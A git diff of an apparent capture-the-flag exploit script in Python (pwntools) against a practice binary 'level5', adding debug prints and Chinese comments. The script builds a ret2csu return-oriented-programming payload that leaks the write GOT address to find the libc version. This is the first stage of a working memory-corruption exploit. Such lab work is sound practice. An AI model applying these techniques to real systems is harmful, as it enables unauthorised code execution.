@@ -41,6 +41,7 @@ if __name__ == '__main__':
     l5 = ELF('./level5')
 
     main = l5.symbols['main']
+    print(hex(main))
 
     payload1 = craft_ret2csu_payload(0x0040061a, # gadget csu
                                      0x004005ec, # gadget func
@@ -48,7 +49,7 @@ if __name__ == '__main__':
                                      1,          # rbp
                                      l5.got["write"],  # r12 write.got
                                      1,          # r13 stdout
-                                     l5.got["write"],  # r14 buffer
+                                     l5.got["write"],  # r14 buffer 6278066737626506568
                                      8,          # r15 size
                                      main # ret
                                      )
@@ -58,4 +59,9 @@ if __name__ == '__main__':
     sh.recvuntil('Hello, World\n')
     sh.send(payload1)
     write_addr = u64(sh.recv(8))
+
+    # 确定了 libc 版本为 libc6-amd64_2.13-0ubuntu13.2_i386
     print(write_addr)
+
+    # 读取完 Helloworld 这一串输出，但是很奇怪这里读取到的是 'orld\n'
+    print(sh.recv())
